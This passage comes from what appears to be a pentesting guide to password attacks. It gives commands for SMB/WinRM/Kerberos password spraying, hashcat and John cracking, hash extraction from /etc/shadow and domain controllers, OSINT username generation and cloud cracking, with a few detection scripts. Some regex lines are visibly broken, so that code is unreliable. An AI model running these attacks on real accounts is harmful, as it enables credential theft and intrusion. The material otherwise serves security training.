success\r\ncrackmapexec smb targets.txt -u users.txt -p passwords.txt --continue-on-success\r\n\r\n# Local authentication\r\ncrackmapexec smb targets.txt -u users.txt -p passwords.txt --local-auth\r\n\r\n# Domain authentication\r\ncrackmapexec smb targets.txt -d domain.com -u users.txt -p passwords.txt\r\n\r\n# WinRM authentication\r\ncrackmapexec winrm targets.txt -u users.txt -p passwords.txt\r\n\r\n# SSH authentication\r\ncrackmapexec ssh targets.txt -u users.txt -p passwords.txt\r\n\r\n# MSSQL authentication\r\ncrackmapexec mssql targets.txt -u users.txt -p passwords.txt\r\n\r\n# LDAP authentication\r\ncrackmapexec ldap target_ip -u users.txt -p passwords.txt\r\n\r\n# Output formats\r\ncrackmapexec smb targets.txt -u users.txt -p passwords.txt --log cme.log\r\n\r\n# Verbose output\r\ncrackmapexec smb targets.txt -u users.txt -p passwords.txt -v\r\n\r\n# Thread control\r\ncrackmapexec smb targets.txt -u users.txt -p passwords.txt -t 100\r\n\r\n# Timeout configuration\r\ncrackmapexec smb targets.txt -u users.txt -p passwords.txt --timeout 60\n"})}),"\n",(0,s.jsx)(e.h3,{id:"44-kerbrute-kerberos-username-enumeration-and-password-spraying",children:"4.4 Kerbrute: Kerberos Username Enumeration and Password Spraying"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Username enumeration\r\nkerbrute userenum --dc dc.domain.com -d domain.com users.txt\r\n\r\n# Password spraying\r\nkerbrute passwordspray --dc dc.domain.com -d domain.com users.txt Password123\r\n\r\n# Brute force single user\r\nkerbrute bruteuser --dc dc.domain.com -d domain.com passwords.txt admin\r\n\r\n# Brute force user list\r\nkerbrute bruteforce --dc dc.domain.com -d domain.com user_pass_combinations.txt\r\n\r\n# Custom port\r\nkerbrute userenum --dc dc.domain.com:88 -d domain.com users.txt\r\n\r\n# Verbose output\r\nkerbrute userenum --dc dc.domain.com -d domain.com users.txt -v\r\n\r\n# Custom delay\r\nkerbrute passwordspray --dc dc.domain.com -d domain.com users.txt Password123 --delay 100\r\n\r\n# Output file\r\nkerbrute userenum --dc dc.domain.com -d domain.com users.txt -o kerbrute_results.txt\r\n\r\n# Thread control\r\nkerbrute passwordspray --dc dc.domain.com -d domain.com users.txt Password123 -t 10\r\n\r\n# Safe mode (reduce detection)\r\nkerbrute passwordspray --dc dc.domain.com -d domain.com users.txt Password123 --safe\n"})}),"\n",(0,s.jsx)(e.h2,{id:"5-specialized-password-attack-techniques",children:"5. Specialized Password Attack Techniques"}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsx)(e.p,{children:"These advanced techniques require careful consideration of target environments and potential impact. Always ensure proper authorization and follow responsible disclosure practices."})}),"\n",(0,s.jsx)(e.h3,{id:"51-rainbow-table-attacks",children:"5.1 Rainbow Table Attacks"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# Generate rainbow tables with rtgen\r\nrtgen md5 loweralpha 1 7 0 3800 33554432 0\r\n\r\n# Generate with specific charset\r\nrtgen md5 loweralpha-numeric 1 8 0 3800 33554432 0\r\n\r\n# Sort rainbow tables\r\nrtsort *.rt\r\n\r\n# Crack hashes with rcrack\r\nrcrack *.rt -h 5d41402abc4b2a76b9719d911017c592\r\n\r\n# Crack hash file\r\nrcrack *.rt -f hashes.txt\r\n\r\n# Generate tables for specific algorithms\r\nrtgen sha1 mixalpha-numeric 1 8 0 3800 33554432 0\r\nrtgen ntlm mixalpha-numeric-space 1 8 0 3800 33554432 0\r\n\r\n# Ophcrack for Windows passwords\r\nophcrack -g -d /path/to/tables -f sam_file.txt\r\n\r\n# Online rainbow table services (academic research only)\r\n# CrackStation, HashKiller, OnlineHashCrack\r\ncurl -X POST -F "hash=5d41402abc4b2a76b9719d911017c592" https://crackstation.net/api/\n'})}),"\n",(0,s.jsx)(e.h3,{id:"52-mask-attack-optimization",children:"5.2 Mask Attack Optimization"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# Statistical mask analysis\r\nhashcat --keyspace -a 3 ?a?a?a?a?a?a?a?a\r\n\r\n# Progressive mask attacks\r\nfor length in $(seq 6 12); do\r\n    mask=$(printf \'?a%.0s\' $(seq 1 $length))\r\n    hashcat -m 0 -a 3 hashes.txt "$mask"\r\ndone\r\n\r\n# Custom mask generation based on known patterns\r\n# Corporate password policies: 8 chars, 1 upper, 1 lower, 1 digit, 1 special\r\nhashcat -m 0 -a 3 hashes.txt -1 ?l?u -2 ?d -3 ?s "?1?1?1?1?1?2?2?3"\r\n\r\n# Date-based masks\r\nfor year in $(seq 2020 2024); do\r\n    hashcat -m 0 -a 3 hashes.txt "password$year"\r\n    hashcat -m 0 -a 3 hashes.txt "Password$year!"\r\ndone\r\n\r\n# Keyboard pattern masks\r\nhashcat -m 0 -a 3 hashes.txt "qwerty?d?d"\r\nhashcat -m 0 -a 3 hashes.txt "123456?l?l"\r\n\r\n# Phone number patterns\r\nhashcat -m 0 -a 3 hashes.txt "?d?d?d-?d?d?d-?d?d?d?d"\r\nhashcat -m 0 -a 3 hashes.txt "(?d?d?d)?d?d?d-?d?d?d?d"\n'})}),"\n",(0,s.jsx)(e.h3,{id:"53-rule-based-password-generation",children:"5.3 Rule-Based Password Generation"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Advanced John the Ripper rules\r\ncat > advanced.rule << 'EOF'\r\n# Basic transformations\r\n:\r\nl\r\nu\r\nc\r\nC\r\nt\r\n\r\n# Append common suffixes\r\n$1 $2 $3\r\n$1 $2 $3 $4\r\n$! $@ $#\r\n$2 $0 $2 $1\r\n$2 $0 $2 $2\r\n$2 $0 $2 $3\r\n$2 $0 $2 $4\r\n\r\n# Prepend common prefixes\r\n^1 ^2 ^3\r\n^1 ^2 ^3 ^4\r\n^! ^@ ^#\r\n^2 ^0 ^2 ^1\r\n\r\n# Substitutions\r\nsa@ si1 se3 so0 sl1 ss$ sg9\r\nsA@ sI1 sE3 sO0 sL1 sS$ sG9\r\n\r\n# Duplications\r\nd\r\ndd\r\n\r\n# Reversals\r\nr\r\nfr\r\n\r\n# Rotations\r\nAq\"[A-Z]\" Az\"[a-z]\"\r\nEOF\r\n\r\n# Apply rules to wordlist\r\njohn --wordlist=base_words.txt --rules=advanced --stdout > enhanced_wordlist.txt\r\n\r\n# Hashcat rule examples\r\ncat > hashcat_rules.rule << 'EOF'\r\n:\r\nl\r\nu\r\nc\r\nC\r\nt\r\n$1 $2 $3\r\n$!\r\n^1 ^2 ^3\r\nsa@\r\nsi1\r\nse3\r\nso0\r\nEOF\r\n\r\n# Generate wordlist with Hashcat rules\r\nhashcat --stdout -a 0 base_words.txt -r hashcat_rules.rule > enhanced_hashcat_wordlist.txt\n"})}),"\n",(0,s.jsx)(e.h3,{id:"54-hybrid-attack-methodologies",children:"5.4 Hybrid Attack Methodologies"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# Wordlist + mask combination\r\nhashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d\r\n\r\n# Mask + wordlist combination\r\nhashcat -m 0 -a 7 hashes.txt ?d?d?d?d wordlist.txt\r\n\r\n# Multiple wordlist combination\r\nhashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt\r\n\r\n# Combinator with rules\r\nhashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt -j \'$-\' -k \'$!\'\r\n\r\n# Prince attack (PRINCE algorithm)\r\nhashcat -m 0 -a 9 hashes.txt wordlist.txt\r\n\r\n# Association attack\r\nhashcat -m 0 -a 9 hashes.txt wordlist.txt --association-max=4\r\n\r\n# Hybrid with custom separator\r\necho -e "password\\nadmin\\ntest" | while read word; do\r\n    hashcat -m 0 -a 6 hashes.txt <(echo "$word") ?d?d?d?d\r\n    hashcat -m 0 -a 6 hashes.txt <(echo "$word") ?d?d?d?d?d?d\r\ndone\n'})}),"\n",(0,s.jsx)(e.h2,{id:"6-password-analysis-and-intelligence-gathering",children:"6. Password Analysis and Intelligence Gathering"}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsx)(e.p,{children:"Intelligence gathering should focus on publicly available information and authorized reconnaissance. Always respect privacy and legal boundaries when collecting password intelligence."})}),"\n",(0,s.jsx)(e.h3,{id:"61-osint-for-password-intelligence",children:"6.1 OSINT for Password Intelligence"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# Company-specific intelligence gathering\r\ntheHarvester -d target.com -l 500 -b google,bing,linkedin\r\n\r\n# Social media password pattern analysis\r\n# Common patterns from breached databases\r\ncurl -s "https://haveibeenpwned.com/api/v3/breachedaccount/email@target.com" \\\r\n     -H "hibp-api-key: YOUR_API_KEY"\r\n\r\n# GitHub credential scanning\r\ntruffleHog --regex --entropy=False https://github.com/target-company/repo\r\n\r\n# Pastebin monitoring\r\ncurl -s "https://psbdmp.ws/api/search/target.com" | jq \'.data[].id\'\r\n\r\n# DNS reconnaissance for password patterns\r\ndnsrecon -d target.com -t std\r\n\r\n# Certificate transparency logs\r\ncurl -s "https://crt.sh/?q=%.target.com&output=json" | jq \'.[].name_value\'\r\n\r\n# Employee enumeration for username generation\r\npython3 linkedin2username.py -c "Target Company" -n "Target Company"\r\n\r\n# Generate usernames from employee names\r\ncat employees.txt | while read first last; do\r\n    echo "${first,,}.${last,,}"\r\n    echo "${first:0:1,,}${last,,}"\r\n    echo "${first,,}${last:0:1,,}"\r\n    echo "${first,,}_${last,,}"\r\ndone > usernames.txt\n'})}),"\n",(0,s.jsx)(e.h3,{id:"62-password-policy-analysis",children:"6.2 Password Policy Analysis"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Windows password policy enumeration\r\nnet accounts /domain\r\n\r\n# PowerShell password policy\r\nGet-ADDefaultDomainPasswordPolicy\r\n\r\n# Linux password policy analysis\r\nchage -l username\r\ncat /etc/login.defs | grep PASS\r\n\r\n# Password complexity analysis script\r\ncat > analyze_policy.py << 'EOF'\r\n#!/usr/bin/env python3\r\nimport re\r\nfrom collections import Counter\r\n\r\ndef analyze_passwords(password_file):\r\n    with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:\r\n        passwords = [line.strip() for line in f if line.strip()]\r\n    \r\n    # Length analysis\r\n    lengths = [len(p) for p in passwords]\r\n    print(f\"Average length: {sum(lengths)/len(lengths):.2f}\")\r\n    print(f\"Length distribution: {Counter(lengths).most_common(10)}\")\r\n    \r\n    # Character set analysis\r\n    upper_count = sum(1 for p in passwords if re.search(r'[A-Z]', p))\r\n    lower_count = sum(1 for p in passwords if re.search(r'[a-z]', p))\r\n    digit_count = sum(1 for p in passwords if re.search(r'\\d', p))\r\n    special_count = sum(1 for p in passwords if re.search(r'[!@#$%^&*(),.?\":{}|<>]', p))\r\n    \r\n    print(f\"Uppercase usage: {upper_count/len(passwords)*100:.1f}%\")\r\n    print(f\"Lowercase usage: {lower_count/len(passwords)*100:.1f}%\")\r\n    print(f\"Digit usage: {digit_count/len(passwords)*100:.1f}%\")\r\n    print(f\"Special char usage: {special_count/len(passwords)*100:.1f}%\")\r\n    \r\n    # Common patterns\r\n    patterns = {\r\n        'year': r'(19|20)\\d{2}',\r\n        'month': r'(0[1-9]|1[0-2])',\r\n        'exclamation': r'!+,\r\n        'digits_end': r'\\d+,\r\n        'common_words': r'(password|admin|user|test|123)',\r\n    }\r\n    \r\n    for pattern_name, pattern in patterns.items():\r\n        count = sum(1 for p in passwords if re.search(pattern, p, re.IGNORECASE))\r\n        print(f\"{pattern_name} pattern: {count/len(passwords)*100:.1f}%\")\r\n\r\nif __name__ == \"__main__\":\r\n    import sys\r\n    if len(sys.argv) != 2:\r\n        print(\"Usage: python3 analyze_policy.py <password_file>\")\r\n        sys.exit(1)\r\n    analyze_passwords(sys.argv[1])\r\nEOF\r\n\r\npython3 analyze_policy.py cracked_passwords.txt\n"})}),"\n",(0,s.jsx)(e.h3,{id:"63-custom-wordlist-generation",children:"6.3 Custom Wordlist Generation"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# CeWL - web crawling wordlist generation\r\ncewl -d 3 -m 6 -w custom_wordlist.txt https://target.com\r\n\r\n# CeWL with email extraction\r\ncewl -d 2 -e -a -w wordlist_with_emails.txt https://target.com\r\n\r\n# Crunch - pattern-based wordlist generation\r\ncrunch 8 8 -t @@@@@@%% -o pattern_wordlist.txt\r\n\r\n# Crunch with custom charset\r\ncrunch 6 10 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_charset.txt\r\n\r\n# Mentalist - graphical wordlist generator\r\n# GUI tool for advanced wordlist generation\r\n\r\n# CUPP - Common User Passwords Profiler\r\npython3 cupp.py -i\r\n\r\n# Password list merger and deduplication\r\ncat wordlist1.txt wordlist2.txt wordlist3.txt | sort -u > merged_wordlist.txt\r\n\r\n# Generate based on keyboard patterns\r\ncat > keyboard_patterns.txt << \'EOF\'\r\nqwerty\r\nqwertyuiop\r\nasdfgh\r\nasdfghjkl\r\nzxcvbn\r\nzxcvbnm\r\n123456\r\n1234567890\r\nqwerty123\r\npassword123\r\nadmin123\r\nEOF\r\n\r\n# Domain-specific wordlist generation\r\necho "target.com" | sed \'s/\\.com//\' > base_domain.txt\r\ncat base_domain.txt | while read domain; do\r\n    echo "$domain"\r\n    echo "$domain123"\r\n    echo "$domain2023"\r\n    echo "$domain2024"\r\n    echo "${domain}!"\r\n    echo "${domain}@123"\r\ndone > domain_wordlist.txt\r\n\r\n# Generate from breach data (authorized analysis only)\r\ncat > breach_analyzer.py << \'EOF\'\r\n#!/usr/bin/env python3\r\nimport sys\r\nfrom collections import Counter\r\n\r\ndef extract_patterns(breach_file, output_file):\r\n    passwords = []\r\n    with open(breach_file, \'r\', encoding=\'utf-8\', errors=\'ignore\') as f:\r\n        for line in f:\r\n            if \':\' in line:\r\n                password = line.split(\':\', 1)[1].strip()\r\n                if 6 <= len(password) <= 20:\r\n                    passwords.append(password)\r\n    \r\n    # Get most common passwords\r\n    common_passwords = Counter(passwords).most_common(10000)\r\n    \r\n    with open(output_file, \'w\') as f:\r\n        for password, count in common_passwords:\r\n            f.write(f"{password}\\n")\r\n\r\nif __name__ == "__main__":\r\n    if len(sys.argv) != 3:\r\n        print("Usage: python3 breach_analyzer.py <breach_file> <output_file>")\r\n        sys.exit(1)\r\n    extract_patterns(sys.argv[1], sys.argv[2])\r\nEOF\n'})}),"\n",(0,s.jsx)(e.h2,{id:"7-advanced-hash-analysis-and-manipulation",children:"7. Advanced Hash Analysis and Manipulation"}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsx)(e.p,{children:"Hash analysis requires understanding of cryptographic algorithms and their implementations. Always verify hash formats before attempting to crack them to avoid wasted computational resources."})}),"\n",(0,s.jsx)(e.h3,{id:"71-hash-identification-and-analysis",children:"7.1 Hash Identification and Analysis"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Automated hash identification\r\nhash-identifier\r\nhashid hash_value\r\nhashcat --help | grep -i \"mode\"\r\n\r\n# Python hash identification script\r\ncat > hash_analyzer.py << 'EOF'\r\n#!/usr/bin/env python3\r\nimport re\r\nimport hashlib\r\nimport sys\r\n\r\ndef identify_hash(hash_value):\r\n    hash_length = len(hash_value)\r\n    hash_patterns = {\r\n        32: ['MD5', 'NTLM'],\r\n        40: ['SHA1'],\r\n        56: ['SHA224'],\r\n        64: ['SHA256'],\r\n        96: ['SHA384'],\r\n        128: ['SHA512'],\r\n        16: ['MySQL 3.x'],\r\n        41: ['MySQL 4.1+'],\r\n    }\r\n    \r\n    # Check for specific patterns\r\n    if re.match(r'^\\$1\\, hash_value):\r\n        return 'MD5(Unix)'\r\n    elif re.match(r'^\\$2[ayb]\\, hash_value):\r\n        return 'bcrypt'\r\n    elif re.match(r'^\\$5\\, hash_value):\r\n        return 'SHA256(Unix)'\r\n    elif re.match(r'^\\$6\\, hash_value):\r\n        return 'SHA512(Unix)'\r\n    elif re.match(r'^\\$P\\, hash_value):\r\n        return 'WordPress'\r\n    elif re.match(r'^\\$H\\, hash_value):\r\n        return 'phpBB3'\r\n    elif ':' in hash_value and len(hash_value.split(':')) == 2:\r\n        return 'Possible salted hash'\r\n    \r\n    return hash_patterns.get(hash_length, ['Unknown'])\r\n\r\ndef test_hash_format(hash_value):\r\n    try:\r\n        # Test if it's valid hex\r\n        int(hash_value, 16)\r\n        return True\r\n    except ValueError:\r\n        return False\r\n\r\nif __name__ == \"__main__\":\r\n    if len(sys.argv) != 2:\r\n        print(\"Usage: python3 hash_analyzer.py <hash_value>\")\r\n        sys.exit(1)\r\n    \r\n    hash_val = sys.argv[1].strip()\r\n    possible_formats = identify_hash(hash_val)\r\n    print(f\"Hash: {hash_val}\")\r\n    print(f\"Length: {len(hash_val)}\")\r\n    print(f\"Possible formats: {possible_formats}\")\r\n    print(f\"Valid hex: {test_hash_format(hash_val)}\")\r\nEOF\r\n\r\npython3 hash_analyzer.py \"5d41402abc4b2a76b9719d911017c592\"\n"})}),"\n",(0,s.jsx)(e.h3,{id:"72-hash-extraction-and-conversion",children:"7.2 Hash Extraction and Conversion"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Windows hash extraction\r\nsecretsdump.py domain/user:password@target_ip\r\nsecretsdump.py -hashes LM:NT domain/user@target_ip\r\n\r\n# Linux shadow file processing\r\nunshadow /etc/passwd /etc/shadow > combined.txt\r\n\r\n# Kerberos hash extraction\r\nGetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -outputfile kerberos_hashes.txt\r\nGetUserSPNs.py domain.com/user:password -request -format hashcat -outputfile spn_hashes.txt\r\n\r\n# Web application hash extraction\r\n# WordPress wp-config.php\r\ngrep -r \"DB_PASSWORD\" /var/www/html/\r\n\r\n# Database hash dumps\r\nmysqldump -u root -p mysql user | grep -E \"(User|Password)\"\r\npg_dump -U postgres -t pg_authid database_name\r\n\r\n# Hash format conversion\r\ncat > hash_converter.py << 'EOF'\r\n#!/usr/bin/env python3\r\nimport sys\r\n\r\ndef convert_hash_format(input_file, output_format):\r\n    with open(input_file, 'r') as f:\r\n        for line in f:\r\n            line = line.strip()\r\n            if not line:\r\n                continue\r\n                \r\n            if output_format == 'hashcat':\r\n                # Convert to hashcat format\r\n                if ':' in line:\r\n                    user, hash_val = line.split(':', 1)\r\n                    print(hash_val)\r\n                else:\r\n                    print(line)\r\n            elif output_format == 'john':\r\n                # Convert to john format\r\n                if ':' in line:\r\n                    print(line)\r\n                else:\r\n                    print(f\"user:{line}\")\r\n\r\nif __name__ == \"__main__\":\r\n    if len(sys.argv) != 3:\r\n        print(\"Usage: python3 hash_converter.py <input_file> <hashcat|john>\")\r\n        sys.exit(1)\r\n    convert_hash_format(sys.argv[1], sys.argv[2])\r\nEOF\r\n\r\n# Extract NTLM hashes from secretsdump output\r\ngrep \":::\" secretsdump_output.txt | cut -d: -f4 > ntlm_hashes.txt\r\n\r\n# Extract NetNTLMv2 from Responder logs\r\ngrep \"NTLMv2\" Responder-Session.log | cut -d: -f4- > netntlmv2_hashes.txt\n"})}),"\n",(0,s.jsx)(e.h3,{id:"73-salt-analysis-and-rainbow-table-defense",children:"7.3 Salt Analysis and Rainbow Table Defense"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Salt extraction and analysis\r\ncat > salt_analyzer.py << 'EOF'\r\n#!/usr/bin/env python3\r\nimport re\r\nfrom collections import Counter\r\n\r\ndef analyze_salts(hash_file):\r\n    salts = []\r\n    with open(hash_file, 'r') as f:\r\n        for line in f:\r\n            line = line.strip()\r\n            # Unix crypt format analysis\r\n            if line.startswith('):\r\n                parts = line.split(')\r\n                if len(parts) >= 3:\r\n                    salt = parts[2] if len(parts) > 2 else ''\r\n                    salts.append(salt)\r\n            # Other salt formats\r\n            elif ':' in line and len(line.split(':')) > 2:\r\n                salt = line.split(':')[1]\r\n                salts.append(salt)\r\n    \r\n    print(f\"Total salts found: {len(salts)}\")\r\n    print(f\"Unique salts: {len(set(salts))}\")\r\n    print(f\"Salt reuse rate: {(len(salts) - len(set(salts))) / len(salts) * 100:.2f}%\")\r\n    \r\n    # Salt length analysis\r\n    salt_lengths = [len(s) for s in salts if s]\r\n    if salt_lengths:\r\n        print(f\"Average salt length: {sum(salt_lengths) / len(salt_lengths):.2f}\")\r\n        print(f\"Salt length distribution: {Counter(salt_lengths).most_common(5)}\")\r\n\r\nif __name__ == \"__main__\":\r\n    import sys\r\n    if len(sys.argv) != 2:\r\n        print(\"Usage: python3 salt_analyzer.py <hash_file>\")\r\n        sys.exit(1)\r\n    analyze_salts(sys.argv[1])\r\nEOF\r\n\r\n# Generate custom rainbow tables with salts\r\nrtgen md5 loweralpha 1 7 0 3800 33554432 0 -salt\r\n\r\n# Hashcat salt handling\r\nhashcat -m 20 salted_hashes.txt wordlist.txt  # SHA1 + salt\r\nhashcat -m 10 salted_hashes.txt wordlist.txt  # MD5 + salt\n"})}),"\n",(0,s.jsx)(e.h2,{id:"8-performance-optimization-and-resource-management",children:"8. Performance Optimization and Resource Management"}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsx)(e.p,{children:"Performance optimization requires understanding of hardware capabilities and thermal management. Monitor system temperatures and power consumption during extended cracking sessions."})}),"\n",(0,s.jsx)(e.h3,{id:"81-hardware-optimization",children:"8.1 Hardware Optimization"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# GPU information and monitoring\r\nnvidia-smi\r\nnvidia-ml-py3\r\n\r\n# Hashcat benchmark\r\nhashcat -b\r\n\r\n# OpenCL device information\r\nhashcat -I\r\n\r\n# Custom workload tuning\r\nhashcat -m 1000 -a 0 hashes.txt wordlist.txt -w 4 -O\r\n\r\n# GPU-specific optimization\r\nhashcat -m 1000 -a 0 hashes.txt wordlist.txt -d 1,2,3 --force\r\n\r\n# Memory usage optimization\r\nhashcat -m 1000 -a 0 hashes.txt wordlist.txt --bitmap-min=24 --bitmap-max=24\r\n\r\n# Performance monitoring script\r\ncat > monitor_performance.sh << \'EOF\'\r\n#!/bin/bash\r\nLOG_FILE="performance.log"\r\necho "Timestamp,GPU_Temp,GPU_Power,Hash_Rate" > $LOG_FILE\r\n\r\nwhile true; do\r\n    TIMESTAMP=$(date \'+%Y-%m-%d %H:%M:%S\')\r\n    GPU_TEMP=$(nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits)\r\n    GPU_POWER=$(nvidia-smi --query-gpu=power.draw --format=csv,noheader,nounits)\r\n    \r\n    # Extract hash rate from hashcat status\r\n    HASH_RATE=$(ps aux | grep hashcat | grep -v grep | wc -l)\r\n    \r\n    echo "$TIMESTAMP,$GPU_TEMP,$GPU_POWER,$HASH_RATE" >> $LOG_FILE\r\n    sleep 60\r\ndone\r\nEOF\r\n\r\nchmod +x monitor_performance.sh\r\n./monitor_performance.sh &\n'})}),"\n",(0,s.jsx)(e.h3,{id:"82-distributed-cracking",children:"8.2 Distributed Cracking"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Hashcat distributed cracking\r\n# Node 1 (master)\r\nhashcat -m 1000 -a 0 hashes.txt wordlist.txt --keyspace\r\n\r\n# Calculate keyspace division\r\nKEYSPACE=123456789\r\nNODES=4\r\nCHUNK_SIZE=$((KEYSPACE / NODES))\r\n\r\n# Node distribution\r\nhashcat -m 1000 -a 0 hashes.txt wordlist.txt -s 0 -l $CHUNK_SIZE          # Node 1\r\nhashcat -m 1000 -a 0 hashes.txt wordlist.txt -s $CHUNK_SIZE -l $CHUNK_SIZE # Node 2\r\n\r\n# John the Ripper distributed\r\njohn --node=1-4/8 passwords.txt  # Node 1 of 4, total 8 nodes\r\njohn --node=2-4/8 passwords.txt  # Node 2 of 4, total 8 nodes\r\n\r\n# Automation script for distributed cracking\r\ncat > distribute_crack.py << 'EOF'\r\n#!/usr/bin/env python3\r\nimport subprocess\r\nimport sys\r\nimport time\r\n\r\ndef get_keyspace(hash_file, wordlist, mode):\r\n    cmd = ['hashcat', '--keyspace', '-m', str(mode), '-a', '0', hash_file, wordlist]\r\n    result = subprocess.run(cmd, capture_output=True, text=True)\r\n    return int(result.stdout.strip())\r\n\r\ndef distribute_work(hash_file, wordlist, mode, nodes):\r\n    keyspace = get_keyspace(hash_file, wordlist, mode)\r\n    chunk_size = keyspace // nodes\r\n    \r\n    print(f\"Total keyspace: {keyspace}\")\r\n    print(f\"Chunk size per node: {chunk_size}\")\r\n    \r\n    for i in range(nodes):\r\n        skip = i * chunk_size\r\n        limit = chunk_size if i < nodes - 1 else keyspace - skip\r\n        \r\n        cmd = [\r\n            'hashcat', '-m', str(mode), '-a', '0',\r\n            hash_file, wordlist,\r\n            '-s', str(skip), '-l', str(limit),\r\n            '--session', f'node_{i}',\r\n            '--potfile-path', f'node_{i}.pot'\r\n        ]\r\n        \r\n        print(f\"Node {i}: {' '.join(cmd)}\")\r\n\r\nif __name__ == \"__main__\":\r\n    if len(sys.argv) != 5:\r\n        print(\"Usage: python3 distribute_crack.py <hash_file> <wordlist> <mode> <nodes>\")\r\n        sys.exit(1)\r\n    \r\n    distribute_work(sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4]))\r\nEOF\n"})}),"\n",(0,s.jsx)(e.h3,{id:"83-cloud-based-cracking",children:"8.3 Cloud-Based Cracking"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# AWS GPU instance setup\r\naws ec2 run-instances \\\r\n    --image-id ami-0abcdef1234567890 \\\r\n    --count 1 \\\r\n    --instance-type p3.2xlarge \\\r\n    --key-name my-key-pair \\\r\n    --security-groups my-sg\r\n\r\n# Google Cloud GPU setup\r\ngcloud compute instances create hashcat-gpu \\\r\n    --zone=us-central1-a \\\r\n    --machine-type=n1-standard-4 \\\r\n    --accelerator=type=nvidia-tesla-k80,count=1 \\\r\n    --image-family=ubuntu-1804-lts \\\r\n    --image-project=ubuntu-os-cloud\r\n\r\n# Docker container for distributed cracking\r\ncat > Dockerfile << \'EOF\'\r\nFROM nvidia/cuda:11.8-devel-ubuntu20.04\r\n\r\nRUN apt-get update && apt-get install -y \\\r\n    wget \\\r\n    unzip \\\r\n    ocl-icd-opencl-dev \\\r\n    && rm -rf /var/lib/apt/lists/*\r\n\r\nWORKDIR /opt\r\nRUN wget https://hashcat.net/files/hashcat-6.2.6.tar.gz \\\r\n    && tar -xzf hashcat-6.2.6.tar.gz \\\r\n    && cd hashcat-6.2.6 \\\r\n    && make\r\n\r\nENV PATH="/opt/hashcat-6.2.6:${PATH}"\r\n\r\nWORKDIR /workspace\r\nCMD ["hashcat", "--help"]\r\nEOF\r\n\r\n# Build and run container\r\ndocker build -t hashcat-gpu .\r\ndocker run --gpus all -v $(pwd):/workspace hashcat-gpu hashcat -b\r\n\r\n# Kubernetes deployment for scaling\r\ncat > hashcat-deployment.yaml << \'EOF\'\r\napiVersion: apps/v1\r\nkind: Deployment\r\nmetadata:\r\n  name: hashcat-cluster\r\nspec:\r\n  replicas: 4\r\n  selector:\r\n    matchLabels:\r\n      app: hashcat\r\n  template:\r\n    metadata:\r\n      labels:\r\n        app: hashcat\r\n    spec:\r\n      containers:\r\n      - name: hashcat\r\n        image: hashcat-gpu:latest\r\n        resources:\r\n          limits:\r\n            nvidia.com/gpu: 1\r\n        volumeMounts:\r\n        - name: shared-storage\r\n          mountPath: /workspace\r\n      volumes:\r\n      - name: shared-storage\r\n        persistentVolumeClaim:\r\n          claimName: hashcat-pvc\r\nEOF\n'})}),"\n",(0,s.jsx)(e.h2,{id:"9-detection-and-defense-mechanisms",children:"9. Detection and Defense Mechanisms"}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsx)(e.p,{children:"Understanding defensive measures is crucial for both attackers and defenders. These techniques help improve organizational security posture and develop better detection capabilities."})}),"\n",(0,s.jsx)(e.h3,{id:"91-attack-detection-signatures",children:"9.1 Attack Detection Signatures"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Log analysis for brute force detection\r\ncat > detect_bruteforce.py << 'EOF'\r\n#!/usr/bin/env python3\r\nimport re\r\nfrom collections import defaultdict, Counter\r\nfrom datetime import datetime, timedelta\r\n\r\ndef analyze_auth_logs(log_file, threshold=5, time_window=300):\r\n    failed_attempts = defaultdict(list)\r\n    \r\n    # Common log patterns\r\n    patterns = [\r\n        r'Failed password for (\\w+) from ([\\d.]+)',  # SSH\r\n        r'authentication failure.*user=(\\w+).*rhost=([\\d.]+)',  # PAM\r\n        r'Invalid user (\\w+) from ([\\d.]+)',  # SSH invalid user\r\n        r'Connection closed by ([\\d.]+) port \\d+ \\[preauth\\]',  # SSH preauth\r\n    ]\r\n    \r\n    with open(log_file, 'r') as f:\r\n        for line in f:\r\n            for pattern in patterns:\r\n                match = re.search(pattern, line)\r\n                if match:\r\n                    if len(match.groups()) == 2:\r\n                        user, ip = match.groups()\r\n                        timestamp = extract_timestamp(line)\r\n                        failed_attempts[ip].append((user, timestamp))\r\n    \r\n    # Detect brute force attacks\r\n    alerts = []\r\n    for ip, attempts in failed_attempts.items():\r\n        if len(attempts) >= threshold:\r\n            recent_attempts = [a for a in attempts \r\n                             if (datetime.now() - a[1]).seconds <= time_window]\r\n            if len(recent_attempts) >= threshold:\r\n                alerts.append({\r\n                    'ip': ip,\r\n                    'attempts': 